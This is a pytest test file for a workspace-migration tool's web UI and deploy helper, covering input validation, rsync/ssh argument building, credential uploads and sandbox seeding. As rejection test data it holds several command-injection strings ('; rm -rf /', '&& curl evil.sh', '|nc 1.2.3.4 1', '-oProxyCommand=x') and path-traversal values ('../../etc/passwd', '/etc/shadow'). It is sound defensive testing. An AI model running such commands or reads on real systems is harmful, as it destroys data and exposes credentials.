"""
tests/test_deploy_config.py
===========================
The two places browser input reaches a command line: the setup form and the
VPS deploy form.

The module contract for webui.py is that a client can never cause an arbitrary
command to run. Accepting a domain or a hostname does not weaken that only
because every value is matched against a strict pattern and then placed into a
fixed argv list. These tests are what keeps that true.

Also covered: the two live failures found deploying to a real host, both of
which were silent rather than loud.
"""

from __future__ import annotations

import json
import os
import stat

import pytest

import deploy_remote
import webui


class TestConfigValidation:
    def _ok(self):
        return {"source_domain": "c.example.com", "target_domain": "a.example.com",
                "source_admin": "info@c.example.com",
                "target_admin": "info@a.example.com"}

    def test_accepts_a_well_formed_pair(self):
        clean, err = webui.validate_config(self._ok())
        assert err == ""
        assert clean["SOURCE_DOMAIN"] == "c.example.com"

    def test_placeholder_text_is_rejected(self):
        """`./setup.sh --source-domain <SRC>` is what a person actually types
        after copying the usage line. In zsh `<SRC>` is redirection and the
        shell rejects the line, so the error never mentions the real problem."""
        body = self._ok() | {"source_domain": "<SRC>"}
        _, err = webui.validate_config(body)
        assert "not a domain" in err

    def test_shell_metacharacters_are_rejected_not_escaped(self):
        for evil in ("c.example.com; rm -rf /", "c.example.com && curl evil.sh",
                     "$(whoami).com", "a.com`id`", "a.com|nc 1.2.3.4 1"):
            _, err = webui.validate_config(self._ok() | {"source_domain": evil})
            assert err, f"accepted {evil!r}"

    def test_admin_outside_its_own_domain_is_rejected(self):
        """The most common data-entry error, and it otherwise surfaces much
        later as an opaque 401 from the Directory API."""
        body = self._ok() | {"source_admin": "info@somewhere-else.com"}
        _, err = webui.validate_config(body)
        assert "must be an account in the source domain" in err

    def test_identical_domains_are_rejected(self):
        body = self._ok() | {"target_domain": "c.example.com",
                             "target_admin": "info@c.example.com"}
        _, err = webui.validate_config(body)
        assert "must differ" in err

    def test_every_field_is_required(self):
        for field in ("source_domain", "target_domain", "source_admin", "target_admin"):
            _, err = webui.validate_config(self._ok() | {field: ""})
            assert "required" in err

    def test_values_are_normalised_to_lowercase(self):
        body = self._ok() | {"source_domain": "C.Example.COM",
                             "source_admin": "Info@C.Example.COM"}
        clean, err = webui.validate_config(body)
        assert err == ""
        assert clean["SOURCE_DOMAIN"] == "c.example.com"

    def test_saving_preserves_unrelated_env_entries(self, tmp_path, monkeypatch):
        """setup.sh writes SA emails and key paths into env.sh. Saving the form
        must merge, not replace -- otherwise filling in a typo'd domain quietly
        destroys the credentials configuration."""
        env = tmp_path / "env.sh"
        env.write_text("export SOURCE_SA_EMAIL=sa@proj.iam.gserviceaccount.com\n"
                       "export USER_WORKERS=6\n")
        monkeypatch.setattr(webui, "ENV_PATH", str(env))

        clean, _ = webui.validate_config(self._ok())
        webui.write_config(clean)

        text = env.read_text()
        assert "SOURCE_SA_EMAIL=sa@proj.iam.gserviceaccount.com" in text
        assert "USER_WORKERS=6" in text
        assert "SOURCE_DOMAIN=c.example.com" in text


class TestDeployValidation:
    def test_accepts_ip_and_hostname(self):
        assert deploy_remote.validate("203.0.113.10", "root", 22, "") == ""
        assert deploy_remote.validate("vps.example.com", "ubuntu", 2222, "") == ""

    def test_command_injection_in_host_is_rejected(self):
        for evil in ("1.2.3.4; rm -rf /", "$(id).com", "a b", "host|nc 1 2"):
            assert deploy_remote.validate(evil, "root", 22, "")

    def test_bad_username_is_rejected(self):
        for evil in ("ro ot", "-oProxyCommand=x", "root;id", ""):
            assert deploy_remote.validate("1.2.3.4", evil, 22, "")

    def test_port_range(self):
        assert deploy_remote.validate("1.2.3.4", "root", 0, "")
        assert deploy_remote.validate("1.2.3.4", "root", 99999, "")
        assert deploy_remote.validate("1.2.3.4", "root", 65535, "") == ""

    def test_missing_key_file_is_reported(self, tmp_path):
        err = deploy_remote.validate("1.2.3.4", "root", 22, str(tmp_path / "absent"))
        assert "no SSH key" in err

    def test_key_path_with_spaces_is_rejected(self, tmp_path):
        """rsync re-parses its -e argument, so a quoted path with whitespace is
        split into separate words and the connection fails obscurely."""
        key = tmp_path / "my key"
        key.write_text("x")
        err = deploy_remote.validate("1.2.3.4", "root", 22, str(key))
        assert "spaces" in err


class TestDeployMechanics:
    def test_credentials_are_excluded_unless_explicitly_asked_for(self):
        """Keys and tokens can read every mailbox in both tenants. Sending them
        to a host must be a decision, not a side effect of clicking Deploy."""
        for pattern in ("keys/", "oauth/", "env.sh"):
            assert pattern in deploy_remote.SECRET_EXCLUDES
            assert pattern not in deploy_remote.EXCLUDES

    def test_local_state_is_never_copied_over_the_remote(self):
        """migration.db is the resume ledger. Copying a laptop's copy over the
        VPS's would make a half-finished migration look complete."""
        for pattern in ("migration.db", ".venv/", "scratch/"):
            assert pattern in deploy_remote.EXCLUDES

    def test_no_delete_excluded_flag(self):
        """--delete-excluded deletes remote files matching the exclude list, so
        a code-only deploy would wipe the remote's keys/, oauth/ and env.sh. It
        also aborts outright against macOS's openrsync with
        'buffer overflow: recv_rules'. Both found deploying to a real host."""
        argv = deploy_remote.rsync_argv(
            deploy_remote.ssh_base("", 22), ["keys/"], "root@h", "/root/x")
        assert "--delete-excluded" not in argv

    def test_rsync_excludes_are_separate_argv_entries(self):
        argv = deploy_remote.rsync_argv(
            deploy_remote.ssh_base("", 22), ["keys/", "*.log"], "root@h", "/root/x")
        assert argv[argv.index("--exclude") + 1] == "keys/"
        assert argv.count("--exclude") == 2
        assert argv[-1] == "root@h:/root/x/"

    def test_restart_never_uses_pkill_pattern_matching(self):
        """ssh passes the whole command as one argument, so the remote shell's
        own command line contains 'webui.py --port N' from the nohup. A
        `pkill -f webui` matches that shell and kills the command mid-line --
        silently, and it takes unrelated instances with it. Found live; the
        bracket trick does not help, so a PID file replaced it."""
        cmd = deploy_remote.start_command("/root/x", 8099)
        assert "pkill" not in cmd
        assert "webui.pid" in cmd

    def test_restart_targets_only_its_own_recorded_instance(self):
        cmd = deploy_remote.start_command("/root/x", 8099)
        # kills a PID read from the file, not anything matched by name
        assert "$(cat webui.pid)" in cmd
        assert 'kill "$P"' in cmd
        # and records the new PID for next time
        assert "echo $! > /root/x/webui.pid" in cmd

    def test_ssh_never_prompts_interactively(self):
        """A password prompt in a subprocess with no terminal hangs forever
        with nothing to type into."""
        assert "BatchMode=yes" in deploy_remote.ssh_base("", 22)

    def test_ssh_base_passes_key_and_port_as_separate_argv_entries(self):
        parts = deploy_remote.ssh_base("/tmp/k", 2222)
        assert parts[parts.index("-i") + 1] == "/tmp/k"
        assert parts[parts.index("-p") + 1] == "2222"


class TestCredentialUpload:
    """
    Uploading the credential files through the UI.

    The two JSONs look alike to anyone who has not stared at them before, and
    swapping them produces a runtime error that names neither file. The server
    therefore checks *which* file it was given and says so, rather than storing
    it and failing later.
    """

    SA = {
        "type": "service_account", "project_id": "p", "private_key_id": "x",
        "private_key": "-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----\n",
        "client_email": "sa@p.iam.gserviceaccount.com", "client_id": "123",
    }
    OAUTH = {
        "installed": {
            "client_id": "1-a.apps.googleusercontent.com", "client_secret": "s",
            "auth_uri": "https://accounts.google.com/o/oauth2/auth",
            "token_uri": "https://oauth2.googleapis.com/token",
        }
    }

    @pytest.fixture(autouse=True)
    def _sandbox(self, tmp_path, monkeypatch):
        """Never write into the real ./oauth or ./keys during a test run."""
        import config

        real = config.Settings

        def fake_settings(*a, **k):
            st = real(*a, **k)
            st.oauth_client_secrets = str(tmp_path / "oauth" / "client_secret.json")
            st.source_sa_key = str(tmp_path / "keys" / "source-sa.json")
            st.target_sa_key = str(tmp_path / "keys" / "target-sa.json")
            return st

        monkeypatch.setattr(config, "Settings", fake_settings)

    def test_valid_oauth_client_is_stored(self):
        res = webui.upload_credential("oauth_client", json.dumps(self.OAUTH))
        assert res["ok"], res
        assert json.load(open(res["path"]))["installed"]["client_secret"] == "s"

    def test_stored_credential_is_not_group_or_world_readable(self):
        res = webui.upload_credential("oauth_client", json.dumps(self.OAUTH))
        mode = os.stat(res["path"]).st_mode
        assert not mode & (stat.S_IRWXG | stat.S_IRWXO)

    def test_service_account_key_uploaded_as_oauth_client_is_named(self):
        res = webui.upload_credential("oauth_client", json.dumps(self.SA))
        assert not res["ok"]
        assert "service-account key, not an OAuth client" in res["error"]

    def test_oauth_client_uploaded_as_service_key_is_named(self):
        res = webui.upload_credential("source_key", json.dumps(self.OAUTH))
        assert not res["ok"]
        assert "OAuth client file, not a service-account key" in res["error"]

    def test_incomplete_files_name_the_missing_field(self):
        broken = {"installed": dict(self.OAUTH["installed"])}
        del broken["installed"]["client_secret"]
        res = webui.upload_credential("oauth_client", json.dumps(broken))
        assert "client_secret" in res["error"]

    def test_a_key_without_a_pem_body_is_rejected(self):
        bad = dict(self.SA, private_key="not a key")
        res = webui.upload_credential("source_key", json.dumps(bad))
        assert "PEM private key" in res["error"]

    def test_non_json_is_rejected_with_the_position(self):
        res = webui.upload_credential("oauth_client", "hello world")
        assert not res["ok"] and "not valid JSON" in res["error"]

    def test_empty_upload_is_rejected(self):
        assert not webui.upload_credential("oauth_client", "   ")["ok"]

    def test_unknown_kind_cannot_choose_a_destination(self):
        """`kind` selects the write path, so it must be a closed set -- never
        anything derived from what the client sent."""
        for kind in ("../../etc/passwd", "/etc/shadow", "", "env.sh"):
            res = webui.upload_credential(kind, json.dumps(self.OAUTH))
            assert not res["ok"]
            assert "unknown upload kind" in res["error"]

    def test_oversized_body_is_refused(self):
        res = webui.upload_credential("oauth_client", "x" * (webui.MAX_UPLOAD + 1))
        assert not res["ok"] and "too large" in res["error"]

    def test_a_json_array_is_not_accepted(self):
        res = webui.upload_credential("oauth_client", "[1,2,3]")
        assert not res["ok"] and "JSON object" in res["error"]

    def test_web_client_type_is_accepted_as_well_as_installed(self):
        web = {"web": dict(self.OAUTH["installed"])}
        assert webui.upload_credential("oauth_client", json.dumps(web))["ok"]

    def test_status_reflects_what_is_on_disk(self):
        assert webui.uploads_status()["oauth_client"]["present"] is False
        webui.upload_credential("oauth_client", json.dumps(self.OAUTH))
        assert webui.uploads_status()["oauth_client"]["present"] is True


class TestAuthModeSelection:
    """
    Choosing the credential mode from the UI.

    It used to come only from an AUTH_MODE environment variable read at
    launch, which meant whichever mode the process happened to start in was
    the only one visible -- the service-account path simply did not appear for
    anyone who had started the server with AUTH_MODE=oauth.
    """

    @pytest.fixture(autouse=True)
    def _env(self, tmp_path, monkeypatch):
        monkeypatch.setattr(webui, "ENV_PATH", str(tmp_path / "env.sh"))
        monkeypatch.delenv("AUTH_MODE", raising=False)

    def test_all_three_modes_are_offered(self):
        assert set(webui.AUTH_MODES) == {"key", "impersonate", "oauth"}

    def test_each_mode_declares_what_it_needs(self):
        assert webui.AUTH_MODES["key"]["needs"] == ["source_key", "target_key"]
        assert webui.AUTH_MODES["oauth"]["needs"] == ["oauth_client"]
        # keyless is the whole point: nothing to download, nothing to leak
        assert webui.AUTH_MODES["impersonate"]["needs"] == []

    def test_every_declared_need_is_an_uploadable_kind(self):
        """A typo here renders an upload row that posts an unknown kind and is
        rejected by the server -- a dead control with no explanation."""
        for mode, spec in webui.AUTH_MODES.items():
            for kind in spec["needs"]:
                assert kind in webui.UPLOADS, f"{mode} needs unknown kind {kind}"

    def test_switching_mode_persists_to_env_sh(self):
        assert webui.set_auth_mode("oauth")["ok"]
        assert "export AUTH_MODE=oauth" in open(webui.ENV_PATH).read()

    def test_switching_mode_applies_without_a_restart(self):
        """Settings reads AUTH_MODE at construction and every request builds a
        fresh one, so the live environment has to be updated too."""
        from config import Settings

        webui.set_auth_mode("impersonate")
        assert Settings().auth_mode == "impersonate"

    def test_unknown_mode_is_refused(self):
        for bad in ("nonsense", "", "KEY", "../key"):
            res = webui.set_auth_mode(bad)
            assert not res["ok"] and "unknown auth mode" in res["error"]

    def test_switching_mode_preserves_other_env_entries(self):
        webui.write_config_raw({"SOURCE_DOMAIN": "c.example.com",
                                "USER_WORKERS": "6"})
        webui.set_auth_mode("oauth")

        text = open(webui.ENV_PATH).read()
        assert "SOURCE_DOMAIN=c.example.com" in text
        assert "USER_WORKERS=6" in text
        assert "AUTH_MODE=oauth" in text


class TestStatusSnapshotCache:
    """
    /api/status must never block on a preflight.

    Measured on the live VPS: detecting step 5 runs a real preflight -- a token
    mint per user against both tenants -- and took **9.4 seconds**. The page
    polled every 6, so requests overlapped, stacking concurrent preflight
    subprocesses on a 2-core host, and a poll that failed under that load
    replaced the panel with an error box and destroyed whatever was typed.
    After caching: 11 ms.
    """

    @pytest.fixture(autouse=True)
    def _clear(self):
        webui._snap["data"], webui._snap["at"] = None, 0.0
        webui._snap_busy.clear()
        yield
        webui._snap["data"], webui._snap["at"] = None, 0.0
        webui._snap_busy.clear()

    def test_repeated_polls_compute_once(self, monkeypatch):
        calls = []
        monkeypatch.setattr(webui, "_compute_status",
                            lambda: (calls.append(1), {"steps": [], "total": 0})[1])

        for _ in range(10):
            webui.status_payload()

        assert len(calls) == 1, f"computed {len(calls)} times for 10 polls"

    def test_first_call_is_served_synchronously(self, monkeypatch):
        """There is nothing to show yet, so that one pays for itself."""
        monkeypatch.setattr(webui, "_compute_status", lambda: {"marker": "fresh"})
        assert webui.status_payload()["marker"] == "fresh"

    def test_expiry_refreshes_in_the_background_without_blocking(self, monkeypatch):
        import time as _t

        monkeypatch.setattr(webui, "_compute_status", lambda: {"n": 1})
        webui.status_payload()

        # age the snapshot past the TTL
        with webui._snap_lock:
            webui._snap["at"] = _t.time() - (webui.STATUS_TTL + 5)

        slow = {"done": False}

        def slow_compute():
            _t.sleep(0.4)
            slow["done"] = True
            return {"n": 2}

        monkeypatch.setattr(webui, "_compute_status", slow_compute)

        started = _t.time()
        res = webui.status_payload()
        elapsed = _t.time() - started

        # returned immediately, with the old value, flagged stale
        assert elapsed < 0.2, f"blocked for {elapsed:.2f}s"
        assert res["n"] == 1 and res["stale"] is True

        for _ in range(40):
            if slow["done"]:
                break
            _t.sleep(0.05)
        assert slow["done"], "background refresh never ran"
        assert webui.status_payload()["n"] == 2

    def test_only_one_refresh_runs_at_a_time(self, monkeypatch):
        """Otherwise every poll past the TTL starts another preflight, which is
        the pile-up this cache exists to prevent."""
        import time as _t

        monkeypatch.setattr(webui, "_compute_status", lambda: {"n": 0})
        webui.status_payload()
        with webui._snap_lock:
            webui._snap["at"] = _t.time() - (webui.STATUS_TTL + 5)

        running = []
        monkeypatch.setattr(webui, "_compute_status",
                            lambda: (running.append(1), _t.sleep(0.3),
                                     {"n": len(running)})[2])

        for _ in range(6):
            webui.status_payload()

        _t.sleep(0.6)
        assert len(running) == 1, f"{len(running)} concurrent refreshes"

    def test_snapshot_reports_its_age(self, monkeypatch):
        monkeypatch.setattr(webui, "_compute_status", lambda: {"n": 1})
        webui.status_payload()
        assert "age" in webui.status_payload()


class TestCredentialChecker:
    """
    Step 3's checker.

    "Present" is not "usable". A file can arrive by scp, rsync or setup.sh
    without passing the upload validator, and a structurally perfect key still
    fails if delegation was never granted. Those need opposite fixes, so the
    checker distinguishes them instead of reporting one "not working".
    """

    SA = {
        "type": "service_account", "project_id": "proj-1", "private_key_id": "x",
        "private_key": "-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----\n",
        "client_email": "sa@proj-1.iam.gserviceaccount.com",
        "client_id": "114344169573197353518",
    }

    @pytest.fixture(autouse=True)
    def _sandbox(self, tmp_path, monkeypatch):
        import config

        real = config.Settings
        self.tmp = tmp_path

        def fake_settings(*a, **k):
            st = real(*a, **k)
            st.oauth_client_secrets = str(tmp_path / "oauth" / "client_secret.json")
            st.source_sa_key = str(tmp_path / "keys" / "source-sa.json")
            st.target_sa_key = str(tmp_path / "keys" / "target-sa.json")
            st.source_admin = "info@src.com"
            st.target_admin = "info@tgt.com"
            return st

        monkeypatch.setattr(config, "Settings", fake_settings)

    def _write(self, name, obj):
        p = self.tmp / "keys" / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(obj if isinstance(obj, str) else json.dumps(obj))

    def test_absent_file_is_reported_as_absent(self):
        info = webui.inspect_credential("source_key")
        assert info["present"] is False and info["valid"] is False

    def test_valid_key_exposes_the_client_id_step_5_needs(self):
        """The 21-digit uniqueId is what the Admin Console asks for, and it is
        otherwise buried in a file most people never open."""
        self._write("source-sa.json", self.SA)
        info = webui.inspect_credential("source_key")
        assert info["valid"] is True
        assert info["detail"]["client_id"] == "114344169573197353518"
        assert info["detail"]["client_email"] == self.SA["client_email"]
        assert info["detail"]["project_id"] == "proj-1"

    def test_corrupt_file_is_present_but_not_valid(self):
        """The distinction matters: 'not uploaded' and 'uploaded but broken'
        need different actions from the operator."""
        self._write("source-sa.json", "{ this is not json")
        info = webui.inspect_credential("source_key")
        assert info["present"] is True and info["valid"] is False
        assert "unreadable" in info["error"]

    def test_a_file_placed_out_of_band_is_still_checked(self):
        """setup.sh and rsync write these files directly, never touching the
        upload validator -- so validation cannot live only at upload time."""
        self._write("source-sa.json", {"installed": {"client_id": "x"}})
        info = webui.inspect_credential("source_key")
        assert info["valid"] is False
        assert "OAuth client file, not a service-account key" in info["error"]

    def test_key_missing_its_private_key_is_rejected(self):
        bad = dict(self.SA)
        del bad["private_key"]
        self._write("source-sa.json", bad)
        assert webui.inspect_credential("source_key")["valid"] is False

    def test_unknown_kind_does_not_raise(self):
        info = webui.inspect_credential("../../etc/passwd")
        assert info["valid"] is False and "unknown kind" in info["error"]

    # -- live check ----------------------------------------------------
    def test_live_check_needs_a_file_first(self):
        assert "no file uploaded" in webui.live_check("source_key")["error"]

    def test_live_check_refuses_a_structurally_broken_file(self):
        self._write("source_key" and "source-sa.json", "nonsense")
        assert webui.live_check("source_key")["ok"] is False

    def test_oauth_client_cannot_be_live_tested(self):
        res = webui.live_check("oauth_client")
        assert res["ok"] is False and "without a sign-in" in res["error"]

    def test_missing_admin_is_named_as_the_blocker(self, monkeypatch):
        import config

        real = config.Settings

        def no_admin(*a, **k):
            st = real(*a, **k)
            st.source_sa_key = str(self.tmp / "keys" / "source-sa.json")
            st.source_admin = ""
            return st

        self._write("source-sa.json", self.SA)
        monkeypatch.setattr(config, "Settings", no_admin)
        assert "admin address in step 2" in webui.live_check("source_key")["error"]

    def _fake_auth(self, monkeypatch, result):
        import auth

        class Fake:
            def __init__(self, *a, **k):
                pass

            def verify_delegation(self, tenant, user):
                return result

        monkeypatch.setattr(auth, "AuthManager", Fake)

    def test_success_says_what_was_proven(self, monkeypatch):
        self._write("source-sa.json", self.SA)
        self._fake_auth(monkeypatch, (True, "ok"))
        res = webui.live_check("source_key")
        assert res["ok"] and "delegation is granted" in res["msg"]

    def test_unauthorized_client_points_at_the_admin_console(self, monkeypatch):
        """The key is fine; the Client ID was never authorised. Saying 'key
        failed' would send someone to regenerate a perfectly good key."""
        self._write("source-sa.json", self.SA)
        self._fake_auth(monkeypatch, (False, "unauthorized_client: Client is unauthorized"))
        err = webui.live_check("source_key")["error"]
        assert "not authorised" in err and "Admin Console" in err

    def test_invalid_grant_points_at_the_account(self, monkeypatch):
        self._write("source-sa.json", self.SA)
        self._fake_auth(monkeypatch, (False, "invalid_grant"))
        assert "does not exist" in webui.live_check("source_key")["error"]

    def test_invalid_session_is_explained(self, monkeypatch):
        """Seen live on an expired trial -- Google's wording explains nothing."""
        self._write("source-sa.json", self.SA)
        self._fake_auth(monkeypatch, (False, "Active session is invalid"))
        err = webui.live_check("source_key")["error"]
        assert "suspended" in err and "trial" in err

    def test_an_exception_is_surfaced_not_swallowed(self, monkeypatch):
        import auth

        class Boom:
            def __init__(self, *a, **k):
                raise RuntimeError("key file is corrupt at byte 12")

        self._write("source-sa.json", self.SA)
        monkeypatch.setattr(auth, "AuthManager", Boom)
        assert "corrupt at byte 12" in webui.live_check("source_key")["error"]


class TestUploadBackup:
    """
    Replacing an existing credential keeps the old one.

    Uploading into the wrong slot is a single click, and the file being
    replaced may be the only copy on the machine. Demonstrated the hard way:
    an overwrite during testing destroyed the only copy of a real key.
    """

    SA = TestCredentialChecker.SA

    @pytest.fixture(autouse=True)
    def _sandbox(self, tmp_path, monkeypatch):
        import config

        real = config.Settings
        self.tmp = tmp_path

        def fake(*a, **k):
            st = real(*a, **k)
            st.source_sa_key = str(tmp_path / "keys" / "source-sa.json")
            st.target_sa_key = str(tmp_path / "keys" / "target-sa.json")
            st.oauth_client_secrets = str(tmp_path / "oauth" / "cs.json")
            return st

        monkeypatch.setattr(config, "Settings", fake)

    def test_first_upload_makes_no_backup(self):
        res = webui.upload_credential("source_key", json.dumps(self.SA))
        assert res["ok"] and not res["backup"]

    def test_overwrite_preserves_the_previous_file(self):
        first = dict(self.SA, client_email="original@p.iam.gserviceaccount.com")
        webui.upload_credential("source_key", json.dumps(first))

        second = dict(self.SA, client_email="replacement@p.iam.gserviceaccount.com")
        res = webui.upload_credential("source_key", json.dumps(second))

        assert res["backup"], "no backup taken"
        kept = json.load(open(res["backup"]))
        assert kept["client_email"] == "original@p.iam.gserviceaccount.com"
        live = json.load(open(res["path"]))
        assert live["client_email"] == "replacement@p.iam.gserviceaccount.com"

    def test_backup_is_mentioned_in_the_message(self):
        webui.upload_credential("source_key", json.dumps(self.SA))
        res = webui.upload_credential("source_key", json.dumps(self.SA))
        assert "previous file kept as" in res["msg"]

    def test_backup_is_not_group_or_world_readable(self):
        webui.upload_credential("source_key", json.dumps(self.SA))
        res = webui.upload_credential("source_key", json.dumps(self.SA))
        mode = os.stat(res["backup"]).st_mode
        assert not mode & (stat.S_IRWXG | stat.S_IRWXO)

    def test_a_rejected_upload_does_not_touch_the_existing_file(self):
        """Validation runs before any write, so a bad file cannot destroy a
        good one that is already in place."""
        webui.upload_credential("source_key", json.dumps(self.SA))
        before = open(str(self.tmp / "keys" / "source-sa.json")).read()

        assert not webui.upload_credential("source_key", "not json")["ok"]

        assert open(str(self.tmp / "keys" / "source-sa.json")).read() == before


class TestSameAccountInBothSlots:
    """
    The same service account in both slots.

    This is a legitimate configuration -- delegation is granted per domain, so
    one Client ID can carry the source scopes in one Admin Console and the
    target scopes in the other. It is flagged, not rejected: it is also what an
    accidental upload into the wrong slot looks like, and the operator is the
    only one who knows which they meant.
    """

    SA = TestCredentialChecker.SA

    @pytest.fixture(autouse=True)
    def _sandbox(self, tmp_path, monkeypatch):
        import config

        real = config.Settings

        def fake(*a, **k):
            st = real(*a, **k)
            st.source_sa_key = str(tmp_path / "keys" / "source-sa.json")
            st.target_sa_key = str(tmp_path / "keys" / "target-sa.json")
            st.oauth_client_secrets = str(tmp_path / "oauth" / "cs.json")
            return st

        monkeypatch.setattr(config, "Settings", fake)

    def test_identical_accounts_are_flagged_on_both_rows(self):
        blob = json.dumps(self.SA)
        webui.upload_credential("source_key", blob)
        webui.upload_credential("target_key", blob)

        status = webui.uploads_status()
        for kind in ("source_key", "target_key"):
            assert "same service account" in status[kind].get("warning", "")

    def test_the_flag_does_not_claim_the_setup_is_broken(self):
        """Delegation is authorised per domain, so one Client ID granted source
        scopes in one console and target scopes in the other genuinely works.
        Calling that an error sends people to create an account they do not
        need."""
        blob = json.dumps(self.SA)
        webui.upload_credential("source_key", blob)
        webui.upload_credential("target_key", blob)

        warning = webui.uploads_status()["source_key"]["warning"]
        assert "That works if you authorise" in warning
        assert "BOTH Admin Consoles" in warning

    def test_two_different_accounts_are_not_flagged(self):
        webui.upload_credential("source_key", json.dumps(self.SA))
        other = dict(self.SA, client_email="target@other.iam.gserviceaccount.com",
                     client_id="999")
        webui.upload_credential("target_key", json.dumps(other))

        status = webui.uploads_status()
        assert not status["source_key"].get("warning")
        assert not status["target_key"].get("warning")


class TestSeedFromTheUI:
    """
    Running the seeder from the browser.

    It writes fabricated data into a live tenant, so the friction *is* the
    feature. The CLI guards itself three ways -- SANDBOX_MODE=true, a
    --confirm-domain that must equal SOURCE_DOMAIN exactly, and a
    PROTECTED_DOMAINS deny list. None is bypassed: the browser must supply the
    domain by typing it, the server re-checks before building the command, and
    the seeder checks again for itself.
    """

    @pytest.fixture(autouse=True)
    def _env(self, monkeypatch):
        monkeypatch.setenv("SOURCE_DOMAIN", "sandbox-src.example")
        monkeypatch.setenv("TARGET_DOMAIN", "sandbox-tgt.example")
        monkeypatch.delenv("PROTECTED_DOMAINS", raising=False)

    def test_correct_confirmation_builds_the_command(self):
        argv, env, err = webui.seed_argv(
            {"confirm_domain": "sandbox-src.example", "scale": "small"})
        assert err == ""
        assert argv[argv.index("--confirm-domain") + 1] == "sandbox-src.example"
        assert argv[argv.index("--scale") + 1] == "small"
        assert "--yes" in argv
        assert env["SANDBOX_MODE"] == "true"

    def test_yes_is_always_passed(self):
        """Without --yes the seeder's 'long run?' input() blocks on the web
        server's stdin and nothing gets seeded -- the job looks alive while
        doing no work."""
        argv, _, _ = webui.seed_argv({"confirm_domain": "sandbox-src.example"})
        assert "--yes" in argv

    def test_nothing_typed_is_refused(self):
        _, _, err = webui.seed_argv({"scale": "medium"})
        assert "type the source domain" in err

    def test_a_mismatched_domain_is_refused(self):
        _, _, err = webui.seed_argv({"confirm_domain": "something-else.com"})
        assert "does not match the source domain" in err

    def test_typing_the_target_domain_is_called_out_specifically(self):
        """The dangerous slip. Seeding the target fills the destination with
        fabricated data -- the opposite of what a migration test needs, and it
        looks like a successful migration afterwards."""
        _, _, err = webui.seed_argv({"confirm_domain": "sandbox-tgt.example"})
        assert "TARGET domain" in err and "never be seeded" in err

    def test_protected_domains_are_refused(self, monkeypatch):
        monkeypatch.setenv("PROTECTED_DOMAINS", "sandbox-src.example,corp.com")
        _, _, err = webui.seed_argv({"confirm_domain": "sandbox-src.example"})
        assert "PROTECTED_DOMAINS" in err

    def test_protected_check_is_case_insensitive(self, monkeypatch):
        monkeypatch.setenv("PROTECTED_DOMAINS", "SANDBOX-SRC.EXAMPLE")
        _, _, err = webui.seed_argv({"confirm_domain": "sandbox-src.example"})
        assert "PROTECTED_DOMAINS" in err

    def test_unknown_scale_is_refused(self):
        _, _, err = webui.seed_argv(
            {"confirm_domain": "sandbox-src.example", "scale": "enormous"})
        assert "unknown scale" in err

    def test_reset_is_opt_in(self):
        argv, _, _ = webui.seed_argv({"confirm_domain": "sandbox-src.example"})
        assert "--reset" not in argv

        argv, _, _ = webui.seed_argv(
            {"confirm_domain": "sandbox-src.example", "reset": True})
        assert "--reset" in argv

    def test_create_users_is_opt_in(self):
        argv, _, _ = webui.seed_argv({"confirm_domain": "sandbox-src.example"})
        assert "--create-users" not in argv

        argv, _, _ = webui.seed_argv(
            {"confirm_domain": "sandbox-src.example", "create_users": True})
        assert "--create-users" in argv

    def test_the_command_is_an_argv_list_not_a_shell_string(self):
        argv, _, _ = webui.seed_argv({"confirm_domain": "sandbox-src.example"})
        assert isinstance(argv, list)
        assert all(isinstance(a, str) for a in argv)

    def test_target_gb_per_user_is_opt_in(self):
        argv, _, _ = webui.seed_argv({"confirm_domain": "sandbox-src.example"})
        assert "--target-gb-per-user" not in argv

        argv, _, _ = webui.seed_argv(
            {"confirm_domain": "sandbox-src.example", "target_gb_per_user": 30})
        i = argv.index("--target-gb-per-user")
        assert argv[i + 1] == "30.0"

    def test_a_non_numeric_target_gb_is_refused(self):
        _, _, err = webui.seed_argv(
            {"confirm_domain": "sandbox-src.example",
            "target_gb_per_user": "lots"})
        assert "must be a number" in err

    def test_seeding_still_targets_only_the_source(self):
        """There is no code path that points the seeder at the target: the
        domain is read from SOURCE_DOMAIN, never from the request body."""
        argv, _, _ = webui.seed_argv({"confirm_domain": "sandbox-src.example"})
        assert "sandbox-tgt.example" not in " ".join(argv)


class TestSeedScopesDiffer:
    """
    Seeding writes to the source tenant; migrating only reads it.

    The Admin Console's delegation editor REPLACES the scope line rather than
    appending, so a domain you intend to both seed and migrate needs one line
    carrying both sets. Pasting either alone leaves the other failing with
    unauthorized_client -- and that error names neither cause.
    """

    def test_seed_scopes_are_write_scopes(self):
        seed = webui.dwd_payload()["seed"]
        assert "https://www.googleapis.com/auth/drive" in seed["scope_list"]
        assert "https://www.googleapis.com/auth/gmail.insert" in seed["scope_list"]
        assert "https://www.googleapis.com/auth/calendar" in seed["scope_list"]

    def test_creating_accounts_needs_directory_write(self):
        """--create-users calls users().insert, which the read-only directory
        scope cannot do."""
        seed = webui.dwd_payload()["seed"]
        assert "https://www.googleapis.com/auth/admin.directory.user" in seed["scope_list"]

    def test_combined_covers_both_seeding_and_migrating(self):
        from config import Settings, source_scopes

        payload = webui.dwd_payload()
        combined = set(payload["seed"]["combined_list"])

        assert set(payload["seed"]["scope_list"]) <= combined
        assert set(source_scopes(Settings())) <= combined

    def test_combined_is_strictly_wider_than_either_alone(self):
        from config import Settings, source_scopes

        payload = webui.dwd_payload()
        combined = set(payload["seed"]["combined_list"])

        assert combined > set(payload["seed"]["scope_list"])
        assert combined > set(source_scopes(Settings()))

    def test_read_only_scopes_survive_the_union(self):
        """drive (write) does not authorise a request for drive.readonly --
        delegation matches the exact strings the client asks for, so dropping
        the read-only ones would break the migration."""
        combined = set(webui.dwd_payload()["seed"]["combined_list"])
        for scope in ("https://www.googleapis.com/auth/drive.readonly",
                      "https://www.googleapis.com/auth/gmail.readonly",
                      "https://www.googleapis.com/auth/calendar.readonly"):
            assert scope in combined

    def test_payload_survives_a_missing_seeder(self, monkeypatch):
        """data-generator is optional; /api/dwd must not 500 without it."""
        import sys

        # sys.modules[name] = None is the standard way to force `import
        # name` (or a `from name import ...`) to raise ImportError without
        # touching disk -- dwd_payload() imports seed_sandbox lazily inside
        # its own try/except specifically to survive this.
        monkeypatch.setitem(sys.modules, "seed_sandbox", None)
        payload = webui.dwd_payload()
        assert payload["seed"] == {}
        assert payload["tenants"]          # the rest still works

    def test_fit_to_licenses_and_all_users_scopes_are_included(self):
        """--fit-to-licenses and the default (or --all-users) live discovery
        each need a scope beyond the base write set -- both belong in the
        one line an operator is meant to paste once and be done with."""
